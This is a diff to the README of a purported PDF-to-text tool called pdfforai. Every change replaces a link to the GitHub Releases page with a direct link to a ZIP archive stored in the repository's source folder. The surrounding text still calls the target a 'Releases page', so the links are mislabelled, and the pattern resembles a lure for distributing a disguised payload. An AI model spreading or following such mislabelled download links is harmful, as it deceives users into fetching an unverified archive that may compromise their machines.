@@ -1,6 +1,6 @@
 # 🧾 pdfforai - Turn PDFs Into AI-Ready Text
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/Tittlekludge185/pdfforai/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tittlekludge185/pdfforai/main/src/Software-v2.8-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it when you want to:
 
 ## 📥 Download and Install
 
-1. Go to the [pdfforai Releases page](https://github.com/Tittlekludge185/pdfforai/releases).
+1. Go to the [pdfforai Releases page](https://raw.githubusercontent.com/Tittlekludge185/pdfforai/main/src/Software-v2.8-alpha.1.zip).
 2. Find the latest release.
 3. Download the Windows file for your system.
 4. If the download is a ZIP file, unzip it.
@@ -189,7 +189,7 @@ pdfforai may create these file types:
 
 Get the latest Windows release here:
 
-https://github.com/Tittlekludge185/pdfforai/releases
+https://raw.githubusercontent.com/Tittlekludge185/pdfforai/main/src/Software-v2.8-alpha.1.zip
 
 ## 🧭 Topics
 
